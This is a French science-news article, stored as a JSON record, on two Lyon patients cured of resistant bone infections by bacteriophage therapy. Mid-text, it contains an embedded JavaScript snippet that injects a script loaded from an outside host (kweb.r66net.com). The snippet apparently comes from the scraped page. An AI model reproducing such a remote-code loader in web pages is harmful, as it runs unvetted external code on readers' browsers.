{"title": "Phagothérapie : deux patients guéris grâce à des virus", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "21/09/2017", "content": "Deux patients qui souffraient d'infections ostéo-articulaires ont été guéris grâce à des virus mangeurs de bactéries : les bactériophages. Cette avancée majeure a été obtenue aux Hospices civils de Lyon (HCL) grâce à des virus préparés par la société Pherecydes Pharma. Les  bactériophages , ou phages, sont des  virus  qui s'attaquent à des  bactéries . Présents en grandes quantités dans les eaux usées, les phages ont été mis en évidence il y a un siècle par Frederick Twort, en 1915, et  Félix d’Hérelle , en 1917. Malgré son potentiel pour soigner des infections bactériennes, la  phagothérapie  (à savoir, une  thérapie  à base de bactériophages) a été délaissée au profit des  antibiotiques . Mais certains pays l'ont conservée, comme la Géorgie, où certains  patients français  vont se faire soigner.  À l'heure où les bactéries multirésistantes posent de plus en plus de problèmes de santé publique, la  phagothérapie  apparaît comme une piste de traitement intéressante. Des résultats encourageants viennent d'être obtenus à Lyon, chez deux patients qui ne pouvaient pas cicatriser à cause d'infections ostéo-articulaires résistantes. Un patient avait une  bactérie   Pseudomonas  aeruginosa  multirésistante et l'autre un  staphylocoque doré .   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Des patients en impasse thérapeutique guéris par des bactériophages Pherecydes Pharma, une entreprise de  biotechnologie  française, a sélectionné les virus les plus appropriés en les testant sur les bactéries des patients, afin de créer un traitement sur mesure. Les phages ont ensuite été appliqués sur le site de l'infection, à l'hôpital de la Croix-Rousse de Lyon. Les plaies ont cicatrisé. Ce traitement ne dispose pas d' AMM  (autorisation de mise sur le marché) en France, mais Pherecydes Pharma a obtenu une ATU (autorisation temporaire d'utilisation) pour traiter ces deux patients à titre compassionnel. Dans un  communiqué , Tristan Ferry, médecin à l'hôpital de la Croix-Rousse a expliqué :  « Nous sommes impatients d'explorer la piste thérapeutique prometteuse des bactériophages pour lutter contre l' antibiorésistance .  [Celle-ci]  pourrait augmenter significativement les  guérisons  dans les infections ostéo-articulaires ». Des bactériophages pour contrer les bactéries résistantes aux antibiotiques                       Les antibiotiques sont de moins en moins efficaces car les bactéries sont de plus en plus résistantes. L’Institut Pasteur travaille donc au quotidien sur des solutions dont l'une utilise les bactériophages, des virus n'infectant que les bactéries. Laurent Debarbieux, responsable du groupe Interactions bactériophages-bactéries chez l’animal, nous en parle plus en détail durant cette interview.                                       ", "theme": "sante"}